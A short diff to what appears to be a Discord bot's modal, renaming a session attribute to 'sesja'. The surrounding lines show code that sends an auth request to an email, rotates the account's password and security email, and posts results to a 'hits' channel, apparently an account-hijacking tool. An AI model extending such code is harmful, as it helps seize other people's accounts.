@@ -128,10 +128,10 @@ class MyModalOne(ui.Modal):
             ),
         )
 
-        self.session = open_session()
+        self.sesja = open_session()
 
         try:
-            email_info = await send_auth(self.session, email)
+            email_info = await send_auth(self.sesja, email)
         except Exception:
             rom.exception("send_auth failed for %s", email)
             await _set_ephemeral(
@@ -258,11 +258,11 @@ class MyModalOne(ui.Modal):
                     config = json.load(open("config/config.json", "r"))
                     hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
-                    # Authenticator login already has a session; RecoverUser still
+                    # Authenticator login already has a sesja; RecoverUser still
                     # runs (recovery=True) to rotate password / security email.
                     try:
                         securedAccount = await romeo_secure(
-                            self.session,
+                            self.sesja,
                             email,
                             device,
                             embed_verify=True,
